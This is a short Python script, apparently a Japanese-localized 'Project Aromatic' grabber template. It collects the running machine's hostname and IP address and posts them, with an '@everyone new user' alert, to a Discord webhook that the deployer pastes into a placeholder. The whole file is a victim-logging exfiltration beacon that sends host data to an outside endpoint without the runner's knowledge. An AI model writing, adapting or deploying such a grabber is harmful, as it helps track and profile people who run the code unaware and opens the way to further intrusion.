import requests
import socket
import time
## Translation by private

host = socket.gethostname()
ip = socket.gethostbyname(host)

h00k = "ウェブフックはここにペースとしてください"

data = {
    "embeds": [{
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzYpikPP4JfmxrQTTmPTl8E_0pf9wc50rUQA&s",
        "username": "あろまちゃん",
        "content": "@everyone 新しいユーザー",
        "title": "Aromatic ^-^ IP Info",
        "thumbnail": {
            "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzYpikPP4JfmxrQTTmPTl8E_0pf9wc50rUQA&s"
        },
        "fields": [
            {
                "name": "💻️ ネットワークホストの名前",
                "value": f"{host}",
                "inline": True
            },
            {
                "name": "👀 ネットワークアドレス",
                "value": f"{ip}",
                "inline": True
            },
        ],
        "footer": {
            "text": "Make by Project Aromatic"
        }
    }]
}


response = requests.post(h00k, json=data)
